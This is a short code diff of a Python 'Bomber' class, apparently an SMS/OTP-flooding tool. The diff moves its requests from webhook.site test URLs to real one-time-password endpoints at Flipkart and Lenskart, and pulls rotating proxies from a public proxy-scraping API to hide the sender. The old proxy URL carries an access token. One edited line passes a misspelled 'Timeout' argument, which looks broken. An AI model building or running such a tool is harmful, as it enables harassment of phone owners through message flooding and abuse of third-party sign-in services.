@@ -27,16 +27,16 @@ class Bomber:
 			return False
 
 	def getproxy(self):
-		proxy_scrape_url = "https://raw.githubusercontent.com/aioxzp/call1/main/proxy.txt?token=GHSAT0AAAAAAB5RUIEMGT7COD3Q67AEL5ZGY7CFTHA"
+		proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
 		try:
-			proxy_request = requests.get(proxy_scrape_url)
+			proxy_request = requests.get(proxy_scrape_url, Timeout =  10)
 		except:
 			return False
 		proxylist =  proxy_request.text.split()
 		return 'https://' + random.choice(proxylist)
 	
 	def flipkart(self):
-		url = "https://webhook.site/1757003c-12ec-446a-9830-5fe1878b0c36"
+		url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
 		flipkart_header = {
 		"Accept": "*/*",
 		"Accept-Encoding": "gzip, deflate, br",
@@ -88,7 +88,7 @@ class Bomber:
 
 
 	def lenskart(self):
-		url = "https://webhook.site/1757003c-12ec-446a-9830-5fe1878b0c36"
+		url = "https://api.lenskart.com/v2/customers/sendOtp"
 		lenskat_header = {
 			"accept": "application/json, text/plain, */*",
 			"accept-encoding": "gzip, deflate, br",
